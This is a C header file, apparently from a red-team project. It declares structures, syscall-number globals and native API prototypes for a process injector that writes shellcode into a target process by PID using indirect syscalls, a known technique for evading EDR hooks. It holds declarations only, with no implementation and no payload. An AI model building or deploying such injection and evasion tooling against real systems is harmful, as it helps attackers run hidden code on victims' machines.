#pragma once
#include <stdio.h>
#include <windows.h>

#define STATUS_SUCCESS (NTSTATUS)0x00000000L
#define OKAY(MSG, ...) printf("[+] " MSG "\n", ##__VA_ARGS__)
#define INFO(MSG, ...) printf("[i] " MSG "\n", ##__VA_ARGS__)
#define WARN(MSG, ...) printf("[-] " MSG "\n", ##__VA_ARGS__)
#define PROG(MSG, ...) printf("\r[*] " MSG,    ##__VA_ARGS__) /* solely for iterations */

DWORD g_NtOpenProcessSSN;
DWORD g_NtAllocateVirtualMemorySSN;
DWORD g_NtWriteVirtualMemorySSN;
DWORD g_NtCreateThreadExSSN;
DWORD g_NtWaitForSingleObjectSSN;
DWORD g_NtCloseSSN;

typedef unsigned __int64 QWORD;
/* you only need one (1) of these, i've put them all down for completeness */
QWORD g_NtOpenProcessSyscall;
QWORD g_NtAllocateVirtualMemorySyscall;
QWORD g_NtWriteVirtualMemorySyscall;
QWORD g_NtCreateThreadExSyscall;
QWORD g_NtWaitForSingleObjectSyscall;
QWORD g_NtCloseSyscall;

typedef struct _PS_ATTRIBUTE {
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
    (p)->RootDirectory = r;                           \
    (p)->Attributes = a;                              \
    (p)->ObjectName = n;                              \
    (p)->SecurityDescriptor = s;                      \
    (p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST {
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

extern NTSTATUS fn_NtOpenProcess(
        OUT PHANDLE ProcessHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes,
        IN PCLIENT_ID ClientId OPTIONAL
);

extern NTSTATUS fn_NtAllocateVirtualMemory(
        IN HANDLE ProcessHandle,
        IN OUT PVOID* BaseAddress,
        IN ULONG ZeroBits,
        IN OUT PSIZE_T RegionSize,
        IN ULONG AllocationType,
        IN ULONG Protect
);

extern NTSTATUS fn_NtWriteVirtualMemory(
        IN HANDLE ProcessHandle,
        IN PVOID BaseAddress,
        IN PVOID Buffer,
        IN SIZE_T NumberOfBytesToWrite,
        OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern NTSTATUS fn_NtCreateThreadEx(
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN HANDLE ProcessHandle,
        IN PVOID StartRoutine,
        IN PVOID Argument OPTIONAL,
        IN ULONG CreateFlags,
        IN SIZE_T ZeroBits,
        IN SIZE_T StackSize,
        IN SIZE_T MaximumStackSize,
        IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
);

extern NTSTATUS fn_NtWaitForSingleObject(
        _In_ HANDLE Handle,
        _In_ BOOLEAN Alertable,
        _In_opt_ PLARGE_INTEGER Timeout
);

extern NTSTATUS fn_NtClose(
        IN HANDLE Handle
);

/*!
 * @brief 
 *  Retreives the syscall number and syscall instruction for a specific NTAPI.
 *  This can be made to be much better considering you don't need to find syscall
 *  addresses for all the functions you need to use. 
 * 
 * @param NTDLLHandle 
 *  A handle to ntdll.
 *
 * @param NtFunctionName 
 *  The name of the function you want to use.
 * 
 * @param NtFunctionSSN 
 *  The specified native function's SSN.
 * 
 * @param NtFunctionSyscallAddress 
 *  The specified native function's syscall instruction address.
 * 
 * @return Void.
 */
VOID IndirectPrelude(
        _In_ HMODULE NTDLLHandle,
        _In_ LPCSTR NtFunctionName,
        _Out_ PDWORD NtFunctionSSN,
        _Out_ PUINT_PTR NtFunctionSyscallAddress
);

/*!
 * @brief 
 *  Prints out a functions error code with the functions name for easier debugging.
 *
 * @param FunctionName 
 *  Name of the function.
 *
 * @param Error 
 *  The system error code returned by GetLastError();
 *  GetLastError() just reads from the _TEB at the LastError member/offset (_TEB->LastError), 
 *  so any function/routine that does this can be used in place of GetLastError().
 *
 * @return Void.
 */
VOID PrettyFormat(
        _In_ LPCSTR FunctionName,
        _In_ CONST DWORD Error
);

/*!
 * @brief 
 *  Injects a target process with indirect syscalls.
 * 
 * @param PID 
 *  The pid of the target process.
 * 
 * @param Payload 
 *  The shellcode byte stream you wish to inject.
 * 
 * @param PayloadSize 
 *  The size of the payload.
 *
 * @return Bool. 
 *  True if successful, false if not.
 */
BOOL IndirectSyscallsInjection(
        _In_ CONST DWORD PID,
        _In_ CONST PBYTE Payload,
        _In_ CONST SIZE_T PayloadSize
);
